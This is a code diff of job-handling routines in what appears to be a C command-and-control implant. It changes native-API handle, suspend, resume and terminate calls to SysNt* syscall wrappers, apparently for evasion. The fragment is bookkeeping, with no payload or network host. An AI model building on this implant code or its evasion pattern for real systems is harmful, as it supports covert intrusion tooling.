@@ -120,17 +120,17 @@ VOID JobCheckList()
                         PackageTransmit( Package, NULL, NULL );
 
                         // free resources
-                        Instance.Win32.NtClose( JobList->Handle );
+                        SysNtClose( JobList->Handle );
                         JobList->Handle = NULL;
                         if ( ( ( PANONPIPE ) JobList->Data )->StdOutWrite )
                         {
-                            Instance.Win32.NtClose( ( ( PANONPIPE ) JobList->Data )->StdOutWrite );
+                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutWrite );
                             (( PANONPIPE ) JobList->Data )->StdOutWrite = NULL;
                         }
 
                         if ( ( ( PANONPIPE ) JobList->Data )->StdOutRead )
                         {
-                            Instance.Win32.NtClose( ( ( PANONPIPE ) JobList->Data )->StdOutRead );
+                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutRead );
                             ( ( PANONPIPE ) JobList->Data )->StdOutRead = NULL;
                         }
                         DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
@@ -200,14 +200,11 @@ BOOL JobSuspend( DWORD JobID )
 
                 if ( Handle )
                 {
-                    NtStatus = Instance.Syscall.NtSuspendThread( JobList->Handle, NULL );
-                    if ( NT_SUCCESS( NtStatus ) )
-                    {
+                    NtStatus = SysNtSuspendThread( JobList->Handle, NULL );
+                    if ( NT_SUCCESS( NtStatus ) ) {
                         JobList->State = JOB_STATE_SUSPENDED;
                         return TRUE;
-                    }
-                    else
-                    {
+                    } else {
                         return FALSE;
                     }
                 }
@@ -249,7 +246,7 @@ BOOL JobResume( DWORD JobID )
 
                 if ( Handle )
                 {
-                    NtStatus = Instance.Syscall.NtResumeThread( JobList->Handle, NULL );
+                    NtStatus = SysNtResumeThread( JobList->Handle, NULL );
                     if ( NT_SUCCESS( NtStatus ) )
                     {
                         JobList->State = JOB_STATE_RUNNING;
@@ -303,7 +300,7 @@ BOOL JobKill( DWORD JobID )
                         {
                             PUTS( "Kill using handle" )
 
-                            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
+                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                             {
                                 PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                                 NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
@@ -422,7 +419,7 @@ VOID JobRemove( DWORD JobID )
     }
 
     if ( JobToRemove->Handle )
-        Instance.Win32.NtClose( JobToRemove->Handle );
+        SysNtClose( JobToRemove->Handle );
 
     if ( ( JobToRemove->Type == JOB_TYPE_TRACK_PROCESS ) && JobToRemove->Data )
     {
